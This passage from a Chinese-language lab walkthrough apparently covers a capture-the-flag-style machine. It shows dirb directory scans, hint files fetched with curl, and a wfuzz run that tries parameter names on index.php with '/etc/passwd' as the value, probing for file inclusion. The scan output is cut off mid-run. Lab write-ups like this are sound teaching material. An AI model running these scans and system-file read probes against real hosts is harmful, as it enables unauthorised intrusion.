class="string">[+] Requests Done: 49</span></span><br><span class="line"><span class="string">[+] Cached Requests: 5</span></span><br><span class="line"><span class="string">[+] Data Sent: 12.599 KB</span></span><br><span class="line"><span class="string">[+] Data Received: 462.296 KB</span></span><br><span class="line"><span class="string">[+] Memory used: 184.582 MB</span></span><br><span class="line"><span class="string">[+] Elapsed time: 00:00:02</span></span><br><span class="line"><span class="string">➜  ~</span></span><br></pre></td></tr></table></figure>
<ul>
<li>没发现什么东西，发现一个目录索引枚举：<code>http://192.168.116.132/wordpress/wp-content/uploads/2019/08/</code>，继续扫目录。</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">➜</span>  <span class="string">~</span> <span class="string">dirb</span> <span class="attr">http://192.168.116.132/</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span><span class="bullet">----------------</span></span><br><span class="line"><span class="string">DIRB</span> <span class="string">v2.22</span>    </span><br><span class="line"><span class="string">By</span> <span class="string">The</span> <span class="string">Dark</span> <span class="string">Raver</span></span><br><span class="line"><span class="bullet">-</span><span class="bullet">----------------</span></span><br><span class="line"></span><br><span class="line"><span class="attr">START_TIME:</span> <span class="string">Fri</span> <span class="string">Sep</span> <span class="number">20</span> <span class="number">08</span><span class="string">:11:33</span> <span class="number">2019</span></span><br><span class="line"><span class="attr">URL_BASE:</span> <span class="attr">http://192.168.116.132/</span></span><br><span class="line"><span class="attr">WORDLIST_FILES:</span> <span class="string">/usr/share/dirb/wordlists/common.txt</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span><span class="bullet">----------------</span></span><br><span class="line"></span><br><span class="line"><span class="string">GENERATED</span> <span class="attr">WORDS:</span> <span class="number">4612</span>                                                          </span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span><span class="meta">---</span> <span class="string">Scanning</span> <span class="attr">URL:</span> <span class="attr">http://192.168.116.132/</span> <span class="bullet">----</span></span><br><span class="line"><span class="string">+</span> <span class="attr">http://192.168.116.132/dev</span> <span class="string">(CODE:200|SIZE:131)</span>                                                                                                                                                                                              </span><br><span class="line"><span class="string">+</span> <span class="attr">http://192.168.116.132/index.php</span> <span class="string">(CODE:200|SIZE:136)</span>                                                                                                                                                                                        </span><br><span class="line"><span class="string">==&gt;</span> <span class="attr">DIRECTORY:</span> <span class="attr">http://192.168.116.132/javascript/</span>                                                                                                                                                                                             </span><br><span class="line"><span class="string">+</span> <span class="attr">http://192.168.116.132/server-status</span> <span class="string">(CODE:403|SIZE:303)</span>                                                                                                                                                                                    </span><br><span class="line"><span class="string">==&gt;</span> <span class="attr">DIRECTORY:</span> <span class="attr">http://192.168.116.132/wordpress/</span>                                                                                                                                                                                              </span><br><span class="line">                                                                                                                                                                                                                                              </span><br><span class="line"><span class="bullet">-</span><span class="meta">---</span> <span class="string">Entering</span> <span class="attr">directory:</span> <span class="attr">http://192.168.116.132/javascript/</span> <span class="bullet">----</span></span><br><span class="line"><span class="string">==&gt;</span> <span class="attr">DIRECTORY:</span> <span class="attr">http://192.168.116.132/javascript/jquery/</span>                                                                                                                                                                                      </span><br><span class="line">                                                                                                                                                                                                                                              </span><br><span class="line"><span class="bullet">-</span><span class="meta">---</span> <span class="string">Entering</span> <span class="attr">directory:</span> <span class="attr">http://192.168.116.132/wordpress/</span> <span class="bullet">----</span></span><br><span class="line"><span class="string">+</span> <span class="attr">http://192.168.116.132/wordpress/index.php</span> <span class="string">(CODE:301|SIZE:0)</span>                                                                                                                                                                                </span><br><span class="line"><span class="string">==&gt;</span> <span class="attr">DIRECTORY:</span> <span class="attr">http://192.168.116.132/wordpress/wp-admin/</span>                                                                                                                                                                                     </span><br><span class="line"><span class="string">==&gt;</span> <span class="attr">DIRECTORY:</span> <span class="attr">http://192.168.116.132/wordpress/wp-content/</span>                                                                                                                                                                                   </span><br><span class="line"><span class="string">==&gt;</span> <span class="attr">DIRECTORY:</span> <span class="attr">http://192.168.116.132/wordpress/wp-includes/</span>                                                                                                                                                                                  </span><br><span class="line"><span class="string">+</span> <span class="attr">http://192.168.116.132/wordpress/xmlrpc.php</span> <span class="string">(CODE:405|SIZE:42)</span>                                                                                                                                                                              </span><br><span class="line">                                                                                                                                                                                                                                              </span><br><span class="line"><span class="bullet">-</span><span class="meta">---</span> <span class="string">Entering</span> <span class="attr">directory:</span> <span class="attr">http://192.168.116.132/javascript/jquery/</span> <span class="bullet">----</span></span><br><span class="line"><span class="string">+</span> <span class="attr">http://192.168.116.132/javascript/jquery/jquery</span> <span class="string">(CODE:200|SIZE:284394)</span>                                                                                                                                                                      </span><br><span class="line">                                                                                                                                                                                                                                              </span><br><span class="line"><span class="bullet">-</span><span class="meta">---</span> <span class="string">Entering</span> <span class="attr">directory:</span> <span class="attr">http://192.168.116.132/wordpress/wp-admin/</span> <span class="bullet">----</span></span><br><span class="line"><span class="string">+</span> <span class="attr">http://192.168.116.132/wordpress/wp-admin/admin.php</span> <span class="string">(CODE:302|SIZE:0)</span>                                                                                                                                                                       </span><br><span class="line"><span class="string">==&gt;</span> <span class="attr">DIRECTORY:</span> <span class="attr">http://192.168.116.132/wordpress/wp-admin/css/</span>                                                                                                                                                                                 </span><br><span class="line"><span class="string">==&gt;</span> <span class="attr">DIRECTORY:</span> <span class="attr">http://192.168.116.132/wordpress/wp-admin/images/</span>                                                                                                                                                                              </span><br><span class="line"><span class="string">==&gt;</span> <span class="attr">DIRECTORY:</span> <span class="attr">http://192.168.116.132/wordpress/wp-admin/includes/</span>                                                                                                                                                                            </span><br><span class="line"><span class="string">+</span> <span class="attr">http://192.168.116.132/wordpress/wp-admin/index.php</span> <span class="string">(CODE:302|SIZE:0)</span>                                                                                                                                                                       </span><br><span class="line"><span class="string">==&gt;</span> <span class="attr">DIRECTORY:</span> <span class="attr">http://192.168.116.132/wordpress/wp-admin/js/</span>                                                                                                                                                                                  </span><br><span class="line"><span class="string">==&gt;</span> <span class="attr">DIRECTORY:</span> <span class="attr">http://192.168.116.132/wordpress/wp-admin/maint/</span>                                                                                                                                                                               </span><br><span class="line"><span class="string">==&gt;</span> <span class="attr">DIRECTORY:</span> <span class="attr">http://192.168.116.132/wordpress/wp-admin/network/</span>                                                                                                                                                                             </span><br><span class="line"><span class="string">==&gt;</span> <span class="attr">DIRECTORY:</span> <span class="attr">http://192.168.116.132/wordpress/wp-admin/user/</span>                                                                                                                                                                                </span><br><span class="line">                                                                                                                                                                                                                                              </span><br><span class="line"><span class="bullet">-</span><span class="meta">---</span> <span class="string">Entering</span> <span class="attr">directory:</span> <span class="attr">http://192.168.116.132/wordpress/wp-content/</span> <span class="bullet">----</span></span><br><span class="line"><span class="string">+</span> <span class="attr">http://192.168.116.132/wordpress/wp-content/index.php</span> <span class="string">(CODE:200|SIZE:0)</span>                                                                                                                                                                     </span><br><span class="line"><span class="string">==&gt;</span> <span class="attr">DIRECTORY:</span> <span class="attr">http://192.168.116.132/wordpress/wp-content/plugins/</span>                                                                                                                                                                           </span><br><span class="line"><span class="string">==&gt;</span> <span class="attr">DIRECTORY:</span> <span class="attr">http://192.168.116.132/wordpress/wp-content/themes/</span>                                                                                                                                                                            </span><br><span class="line"><span class="string">==&gt;</span> <span class="attr">DIRECTORY:</span> <span class="attr">http://192.168.116.132/wordpress/wp-content/uploads/</span>                                                                                                                                                                           </span><br><span class="line">                                                                                                                                                                                                                                              </span><br><span class="line"><span class="bullet">-</span><span class="meta">---</span> <span class="string">Entering</span> <span class="attr">directory:</span> <span class="attr">http://192.168.116.132/wordpress/wp-includes/</span> <span class="bullet">----</span></span><br><span class="line"><span class="string">(!)</span> <span class="attr">WARNING:</span> <span class="string">Directory</span> <span class="string">IS</span> <span class="string">LISTABLE.</span> <span class="literal">No</span> <span class="string">need</span> <span class="string">to</span> <span class="string">scan</span> <span class="string">it.</span>                        </span><br><span class="line">    <span class="string">(Use</span> <span class="string">mode</span> <span class="string">'-w'</span> <span class="string">if</span> <span class="string">you</span> <span class="string">want</span> <span class="string">to</span> <span class="string">scan</span> <span class="string">it</span> <span class="string">anyway)</span></span><br><span class="line">                                                                                                                                                                                                                                              </span><br><span class="line"><span class="bullet">-</span><span class="meta">---</span> <span class="string">Entering</span> <span class="attr">directory:</span> <span class="attr">http://192.168.116.132/wordpress/wp-admin/css/</span> <span class="bullet">----</span></span><br><span class="line"><span class="string">(!)</span> <span class="attr">WARNING:</span> <span class="string">Directory</span> <span class="string">IS</span> <span class="string">LISTABLE.</span> <span class="literal">No</span> <span class="string">need</span> <span class="string">to</span> <span class="string">scan</span> <span class="string">it.</span>                        </span><br><span class="line">    <span class="string">(Use</span> <span class="string">mode</span> <span class="string">'-w'</span> <span class="string">if</span> <span class="string">you</span> <span class="string">want</span> <span class="string">to</span> <span class="string">scan</span> <span class="string">it</span> <span class="string">anyway)</span></span><br><span class="line">                                                                                                                                                                                                                                              </span><br><span class="line"><span class="bullet">-</span><span class="meta">---</span> <span class="string">Entering</span> <span class="attr">directory:</span> <span class="attr">http://192.168.116.132/wordpress/wp-admin/images/</span> <span class="bullet">----</span></span><br><span class="line"><span class="string">(!)</span> <span class="attr">WARNING:</span> <span class="string">Directory</span> <span class="string">IS</span> <span class="string">LISTABLE.</span> <span class="literal">No</span> <span class="string">need</span> <span class="string">to</span> <span class="string">scan</span> <span class="string">it.</span>                        </span><br><span class="line">    <span class="string">(Use</span> <span class="string">mode</span> <span class="string">'-w'</span> <span class="string">if</span> <span class="string">you</span> <span class="string">want</span> <span class="string">to</span> <span class="string">scan</span> <span class="string">it</span> <span class="string">anyway)</span></span><br><span class="line">                                                                                                                                                                                                                                              </span><br><span class="line"><span class="bullet">-</span><span class="meta">---</span> <span class="string">Entering</span> <span class="attr">directory:</span> <span class="attr">http://192.168.116.132/wordpress/wp-admin/includes/</span> <span class="bullet">----</span></span><br><span class="line"><span class="string">(!)</span> <span class="attr">WARNING:</span> <span class="string">Directory</span> <span class="string">IS</span> <span class="string">LISTABLE.</span> <span class="literal">No</span> <span class="string">need</span> <span class="string">to</span> <span class="string">scan</span> <span class="string">it.</span>                        </span><br><span class="line">    <span class="string">(Use</span> <span class="string">mode</span> <span class="string">'-w'</span> <span class="string">if</span> <span class="string">you</span> <span class="string">want</span> <span class="string">to</span> <span class="string">scan</span> <span class="string">it</span> <span class="string">anyway)</span></span><br><span class="line">                                                                                                                                                                                                                                              </span><br><span class="line"><span class="bullet">-</span><span class="meta">---</span> <span class="string">Entering</span> <span class="attr">directory:</span> <span class="attr">http://192.168.116.132/wordpress/wp-admin/js/</span> <span class="bullet">----</span></span><br><span class="line"><span class="string">(!)</span> <span class="attr">WARNING:</span> <span class="string">Directory</span> <span class="string">IS</span> <span class="string">LISTABLE.</span> <span class="literal">No</span> <span class="string">need</span> <span class="string">to</span> <span class="string">scan</span> <span class="string">it.</span>                        </span><br><span class="line">    <span class="string">(Use</span> <span class="string">mode</span> <span class="string">'-w'</span> <span class="string">if</span> <span class="string">you</span> <span class="string">want</span> <span class="string">to</span> <span class="string">scan</span> <span class="string">it</span> <span class="string">anyway)</span></span><br><span class="line">                                                                                                                                                                                                                                              </span><br><span class="line"><span class="bullet">-</span><span class="meta">---</span> <span class="string">Entering</span> <span class="attr">directory:</span> <span class="attr">http://192.168.116.132/wordpress/wp-admin/maint/</span> <span class="bullet">----</span></span><br><span class="line"><span class="string">(!)</span> <span class="attr">WARNING:</span> <span class="string">Directory</span> <span class="string">IS</span> <span class="string">LISTABLE.</span> <span class="literal">No</span> <span class="string">need</span> <span class="string">to</span> <span class="string">scan</span> <span class="string">it.</span>                        </span><br><span class="line">    <span class="string">(Use</span> <span class="string">mode</span> <span class="string">'-w'</span> <span class="string">if</span> <span class="string">you</span> <span class="string">want</span> <span class="string">to</span> <span class="string">scan</span> <span class="string">it</span> <span class="string">anyway)</span></span><br><span class="line">                                                                                                                                                                                                                                              </span><br><span class="line"><span class="bullet">-</span><span class="meta">---</span> <span class="string">Entering</span> <span class="attr">directory:</span> <span class="attr">http://192.168.116.132/wordpress/wp-admin/network/</span> <span class="bullet">----</span></span><br><span class="line"><span class="string">+</span> <span class="attr">http://192.168.116.132/wordpress/wp-admin/network/admin.php</span> <span class="string">(CODE:302|SIZE:0)</span>                                                                                                                                                               </span><br><span class="line"><span class="string">+</span> <span class="attr">http://192.168.116.132/wordpress/wp-admin/network/index.php</span> <span class="string">(CODE:302|SIZE:0)</span>                                                                                                                                                               </span><br><span class="line">                                                                                                                                                                                                                                              </span><br><span class="line"><span class="bullet">-</span><span class="meta">---</span> <span class="string">Entering</span> <span class="attr">directory:</span> <span class="attr">http://192.168.116.132/wordpress/wp-admin/user/</span> <span class="bullet">----</span></span><br><span class="line"><span class="string">+</span> <span class="attr">http://192.168.116.132/wordpress/wp-admin/user/admin.php</span> <span class="string">(CODE:302|SIZE:0)</span>                                                                                                                                                                  </span><br><span class="line"><span class="string">+</span> <span class="attr">http://192.168.116.132/wordpress/wp-admin/user/index.php</span> <span class="string">(CODE:302|SIZE:0)</span>                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                                              </span><br><span class="line"><span class="bullet">-</span><span class="meta">---</span> <span class="string">Entering</span> <span class="attr">directory:</span> <span class="attr">http://192.168.116.132/wordpress/wp-content/plugins/</span> <span class="bullet">----</span></span><br><span class="line"><span class="string">+</span> <span class="attr">http://192.168.116.132/wordpress/wp-content/plugins/index.php</span> <span class="string">(CODE:200|SIZE:0)</span>                                                                                                                                                             </span><br><span class="line">                                                                                                                                                                                                                                              </span><br><span class="line"><span class="bullet">-</span><span class="meta">---</span> <span class="string">Entering</span> <span class="attr">directory:</span> <span class="attr">http://192.168.116.132/wordpress/wp-content/themes/</span> <span class="bullet">----</span></span><br><span class="line"><span class="string">+</span> <span class="attr">http://192.168.116.132/wordpress/wp-content/themes/index.php</span> <span class="string">(CODE:200|SIZE:0)</span>                                                                                                                                                              </span><br><span class="line">                                                                                                                                                                                                                                              </span><br><span class="line"><span class="bullet">-</span><span class="meta">---</span> <span class="string">Entering</span> <span class="attr">directory:</span> <span class="attr">http://192.168.116.132/wordpress/wp-content/uploads/</span> <span class="bullet">----</span></span><br><span class="line"><span class="string">(!)</span> <span class="attr">WARNING:</span> <span class="string">Directory</span> <span class="string">IS</span> <span class="string">LISTABLE.</span> <span class="literal">No</span> <span class="string">need</span> <span class="string">to</span> <span class="string">scan</span> <span class="string">it.</span>                        </span><br><span class="line">    <span class="string">(Use</span> <span class="string">mode</span> <span class="string">'-w'</span> <span class="string">if</span> <span class="string">you</span> <span class="string">want</span> <span class="string">to</span> <span class="string">scan</span> <span class="string">it</span> <span class="string">anyway)</span></span><br><span class="line">                                                                               </span><br><span class="line"><span class="bullet">-</span><span class="bullet">----------------</span></span><br><span class="line"><span class="attr">END_TIME:</span> <span class="string">Fri</span> <span class="string">Sep</span> <span class="number">20</span> <span class="number">08</span><span class="string">:12:01</span> <span class="number">2019</span></span><br><span class="line"><span class="attr">DOWNLOADED:</span> <span class="number">46120</span> <span class="bullet">-</span> <span class="attr">FOUND:</span> <span class="number">15</span></span><br><span class="line"><span class="string">➜</span>  <span class="string">~</span></span><br></pre></td></tr></table></figure>
<ul>
<li>发现有提示文件，找到了第0阶段。提示要用他们的工具去挖掘Web信息。</li>
</ul>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl <span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.116</span><span class="number">.132</span>/dev                                              </span><br><span class="line">hello,</span><br><span class="line"></span><br><span class="line">now you are <span class="keyword">at</span> level <span class="number">0</span> stage.</span><br><span class="line"></span><br><span class="line">In real life pentesting we should use our tools <span class="built_in">to</span> dig <span class="keyword">on</span> <span class="title">a</span> <span class="title">web</span> <span class="title">very</span> <span class="title">hard</span>.</span><br><span class="line"></span><br><span class="line">Happy hacking. </span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure>
<ul>
<li>加上-X参数指定扫描的后缀名。</li>
</ul>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ dirb <span class="string">http:</span><span class="comment">//192.168.116.132/ -X .php,.txt</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2<span class="number">.22</span>    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line"><span class="string">START_TIME:</span> Fri Sep <span class="number">20</span> <span class="number">08</span>:<span class="number">18</span>:<span class="number">05</span> <span class="number">2019</span></span><br><span class="line"><span class="string">URL_BASE:</span> <span class="string">http:</span><span class="comment">//192.168.116.132/</span></span><br><span class="line"><span class="string">WORDLIST_FILES:</span> <span class="regexp">/usr/</span>share<span class="regexp">/dirb/</span>wordlists/common.txt</span><br><span class="line"><span class="string">EXTENSIONS_LIST:</span> (.php,.txt) | (.php)(.txt) [NUM = <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED <span class="string">WORDS:</span> <span class="number">4612</span>                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning <span class="string">URL:</span> <span class="string">http:</span><span class="comment">//192.168.116.132/ ----</span></span><br><span class="line">+ <span class="string">http:</span><span class="comment">//192.168.116.132/image.php (CODE:200|SIZE:147)                                                                </span></span><br><span class="line">+ <span class="string">http:</span><span class="comment">//192.168.116.132/index.php (CODE:200|SIZE:136)                                                                </span></span><br><span class="line">+ <span class="string">http:</span><span class="comment">//192.168.116.132/secret.txt (CODE:200|SIZE:412)                                                               </span></span><br><span class="line">                                                                                                                      </span><br><span class="line">-----------------</span><br><span class="line"><span class="string">END_TIME:</span> Fri Sep <span class="number">20</span> <span class="number">08</span>:<span class="number">18</span>:<span class="number">10</span> <span class="number">2019</span></span><br><span class="line"><span class="string">DOWNLOADED:</span> <span class="number">9224</span> - <span class="string">FOUND:</span> <span class="number">3</span></span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure>
<h2 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h2><ul>
<li>发现另一个提示，准备好模糊测试的工具。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl http://192.168.116.132/secret.txt     </span><br><span class="line">Looks like you have got some secrets.</span><br><span class="line"></span><br><span class="line">Ok I just want to <span class="keyword">do</span> <span class="keyword">some</span> <span class="keyword">help</span> <span class="keyword">to</span> you. </span><br><span class="line"></span><br><span class="line"><span class="keyword">Do</span> <span class="keyword">some</span> more fuzz <span class="keyword">on</span> every page <span class="keyword">of</span> php which was finded <span class="keyword">by</span> you. <span class="keyword">And</span> <span class="keyword">if</span></span><br><span class="line">you <span class="keyword">get</span> <span class="keyword">any</span> <span class="keyword">right</span> parameter <span class="keyword">then</span> follow the below steps. <span class="keyword">If</span> you still stuck </span><br><span class="line">Learn <span class="keyword">from</span> here a basic tool <span class="keyword">with</span> good <span class="keyword">usage</span> <span class="keyword">for</span> OSCP.</span><br><span class="line"></span><br><span class="line">https://github.com/hacknpentest/Fuzzing/<span class="built_in">blob</span>/<span class="keyword">master</span>/Fuzz_For_Web</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//see the location.txt <span class="keyword">and</span> you will <span class="keyword">get</span> your <span class="keyword">next</span> <span class="keyword">move</span>//</span><br><span class="line"></span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure>
<ul>
<li><p>打开链接看到是一个wfuzz的教程，当然里面的字典没有给你，这里推荐两个fuzz的项目：<code>https://github.com/fuzzdb-project/fuzzdb</code>，<code>https://github.com/danielmiessler/SecLists</code>有各种常见的字典，可以fork一个自己慢慢添加。一般我会在zshrc文件中设置环境变量指定字典目录，这样就不用敲目录了。</p>
</li>
<li><p>和我之前写的一篇套路一模一样：<a href="https://blog.kali-team.cn/2018/10/26/Write-up-CH4INRULZ-v1-0-1/">点我参考</a>，先找出文件再测试方法参数，和爆破一句话木马差不多。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ wfuzz -c -w Kali-Team_Tools/fuzzdb/attack/business-logic/CommonMethodNames.txt <span class="string">'http://192.168.116.132/index.php?FUZZ=/etc/passwd'</span>        </span><br><span class="line">libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /home/kali-team/.<span class="built_in">local</span>/lib/python3.7/site-packages/wfuzz/plugins/payloads/bing.py Exception, msg=No module named <span class="string">'shodan'</span></span><br><span class="line">libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /home/kali-team/.<span class="built_in">local</span>/lib/python3.7/site-packages/wfuzz/plugins/payloads/shodanp.py Exception, msg=No module named <span class="string">'shodan'</span></span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4 - The Web Fuzzer                           *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://192.168.116.132/index.php?FUZZ=/etc/passwd</span><br><span class="line">Total requests: 77</span><br><span class="line"></span><br><span class="line">===================================================================</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload                                                                                                                                                                       </span><br><span class="line">===================================================================</span><br><span class="line"></span><br><span class="line">000000001:   200        7 L      12 W     136 Ch      <span class="string">"0"</span>                                                                                                                                                                           </span><br><span class="line">000000002:   200        7 L      12 W     136 Ch      <span class="string">"1"</span>                                                                                                                                                                           </span><br><span class="line">000000003:   200        7 L      12 W     136 Ch      <span class="string">"add"</span>                                                                                                                                                                         </span><br><span class="line">000000004:   200        7 L      12 W     136 Ch      <span class="string">"admin"</span>                                                                                                                                                                       </span><br><span class="line">000000005:   200        7 L      12 W     136 Ch      <span class="string">"alert"</span>                                                                                                                                                                       </span><br><span class="line">000000006:   200        7 L      12 W     136 Ch      <span class="string">"alter"</span>                                                                                                                                                                       </span><br><span class="line">000000007:   200        7 L      12 W     136 Ch      <span class="string">"auth"</span>                                                                                                                                                                        </span><br><span class="line">000000008:   200        7 L      12 W     136 Ch      <span class="string">"authenticate"</span>                                                                                                                                                                </span><br><span class="line">000000009:   200        7 L      12 W     136 Ch      <span class="string">"append"</span>                                                                                                                                                                      </span><br><span class="line">000000010:   200        7 L      12 W     136 Ch      <span class="string">"calc"</span>                                                                                                                                                                        </span><br><span class="line">000000011:   200        7 L      12 W     136 Ch      <span class="string">"calculate"</span>                                                                                                                                                                   </span><br><span class="line">000000012:   200        7 L      12 W     136 Ch      <span class="string">"cancel"</span>                                                                                                                                                                      </span><br><span class="line">000000013:   200        7 L      12 W     136 Ch      <span class="string">"change"</span>                                                                                                                                                                      </span><br><span class="line">000000014:   200        7 L      12 W     136 Ch      <span class="string">"check"</span>                                                                                                                                                                       </span><br><span class="line">000000016:   200        7 L      12 W     136 Ch      <span class="string">"click"</span>                                                                                                                                                                       </span><br><span class="line">000000015:   200        7 L      12 W     136 Ch      <span class="string">"clear"</span>                                                                                                                                                                       </span><br><span class="line">000000017:   200        7 L      12 W     136 Ch      <span class="string">"clone"</span>                                                                                                                                                                       </span><br><span class="line">000000018:   200        7 L      12 W     136 Ch      <span class="string">"close"</span>                                                                                                                                                                       </span><br><span class="line">000000019:   200        7 L      12 W     136 Ch      <span class="string">"create"</span>                                                                                                                                                                      </span><br><span class="line">000000020:   200        7 L      12 W     136 Ch      <span class="string">"crypt"</span>                                                                                                                                                                       </span><br><span class="line">000000021:   200        7 L      12 W     136 Ch      <span class="string">"decrypt"</span>                                                                                                                                                                     </span><br><span class="line">000000022:   200        7 L      12 W     136 Ch      <span class="string">"del"</span>                                                                                                                                                                         </span><br><span class="line">000000023:   200        7 L      12 W     136 Ch      <span class="string">"delete"</span>                                                                                                                                                                      </span><br><span class="line">000000024:   200        7 L      12 W     136 Ch      <span class="string">"demo"</span>                                                                                                                                                                        </span><br><span class="line">000000025:   200        7 L      12 W     136 Ch      <span class="string">"disable"</span>         